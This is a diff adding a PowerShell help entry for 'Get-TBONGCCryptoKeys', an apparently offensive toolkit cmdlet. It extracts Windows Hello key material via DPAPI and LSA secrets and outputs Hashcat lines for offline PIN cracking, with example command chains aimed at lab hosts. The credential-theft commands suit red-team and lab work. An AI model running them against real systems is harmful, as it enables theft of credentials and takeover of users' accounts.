@@ -722,6 +722,153 @@ Get-TBODpapiMemoryDump -ServerName corp1-web01.corp1.lab.home-labs.lol -Path \\c
 
   <command:command>
     <command:details>
+      <command:name>Get-TBONGCCryptoKeys</command:name>
+      <command:verb>Get</command:verb>
+      <command:noun>TBONGCCryptoKeys</command:noun>
+      <maml:description>
+        <maml:para>Enumerates Windows Hello / NGC-related Crypto\Keys entries and extracts PIN cracking material.</maml:para>
+        <maml:para>Reads the LocalService Crypto\Keys directory and correlates key GUIDs with NGC containers (GUID1/GUID2). Decrypts private key properties to extract PBKDF2 salt/rounds and can emit Hashcat mode 28100 ($WINHELLO$) lines.</maml:para>
+        <maml:para>Best-effort private key DPAPI decryption can be attempted for non-PIN protected keys.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Get-TBONGCCryptoKeys</command:name>
+        <command:parameter required="true" position="0">
+          <maml:name>ServerName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>ShareName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Snapshot</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>CryptoKeysPath</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="true">
+          <maml:name>MasterKeys</maml:name>
+          <command:parameterValue>TboDpapiMasterKeyInfo[]</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>IncludeAllKeys</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>IncludeHashcat</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>TryDecryptPrivateKey</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>KeyGuid</maml:name>
+          <command:parameterValue>String[]</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="true" position="0">
+        <maml:name>ServerName</maml:name>
+        <maml:description>
+          <maml:para>Target server name (used for SMB/local-mode file access).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>ShareName</maml:name>
+        <maml:description>
+          <maml:para>SMB share name to use for file access (default: C$).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Snapshot</maml:name>
+        <maml:description>
+          <maml:para>@GMT- snapshot token used to read files from a VSS shadow copy.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>CryptoKeysPath</maml:name>
+        <maml:description>
+          <maml:para>Share-relative path to the Crypto\Keys directory (default: Windows\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Crypto\Keys).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="true">
+        <maml:name>MasterKeys</maml:name>
+        <maml:description>
+          <maml:para>Machine-scope DPAPI master keys (from Get-TBODpapiMasterKeys -Scope Machine).</maml:para>
+        </maml:description>
+        <command:parameterValue>TboDpapiMasterKeyInfo[]</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>IncludeAllKeys</maml:name>
+        <maml:description>
+          <maml:para>Include all Crypto\Keys entries even when a key does not match any NGC GUID mapping.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>IncludeHashcat</maml:name>
+        <maml:description>
+          <maml:para>Include Hashcat 28100 ($WINHELLO$) lines when PBKDF2 parameters are present.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>TryDecryptPrivateKey</maml:name>
+        <maml:description>
+          <maml:para>Attempt best-effort DPAPI decryption of the private key blob using CNG entropy. This will not work for PIN-protected keys.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>KeyGuid</maml:name>
+        <maml:description>
+          <maml:para>Filter by one or more key GUIDs.</maml:para>
+        </maml:description>
+        <command:parameterValue>String[]</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>$mk = Get-TBORegLsaSecrets -ServerName corp1-wks01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
+  Get-TBODpapiMasterKeys -Scope Machine
+Get-TBONGCCryptoKeys -ServerName corp1-wks01.corp1.lab.home-labs.lol -MasterKeys $mk</maml:code>
+        <maml:remarks>
+          <maml:para>Correlates NGC container GUIDs with Crypto\Keys entries and extracts PBKDF2 parameters.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Get-TBONGCCryptoKeys -ServerName corp1-wks01.corp1.lab.home-labs.lol -MasterKeys $mk -IncludeHashcat |
+  Where-Object Hashcat28100 |
+  Select-Object -ExpandProperty Hashcat28100 |
+  Out-File -Encoding ascii winhello.hc28100</maml:code>
+        <maml:remarks>
+          <maml:para>Emits Hashcat 28100 lines for offline PIN cracking.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 3 --------------------------</command:title>
+        <maml:code>Get-TBONGCCryptoKeys -ServerName corp1-wks01.corp1.lab.home-labs.lol -MasterKeys $mk -KeyGuid '{01234567-89ab-cdef-0123-456789abcdef}' -IncludeHashcat</maml:code>
+        <maml:remarks>
+          <maml:para>Filters output to a specific key GUID.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <command:command>
+    <command:details>
       <command:name>Get-TBODpapiBlob</command:name>
       <command:verb>Get</command:verb>
       <command:noun>TBODpapiBlob</command:noun>
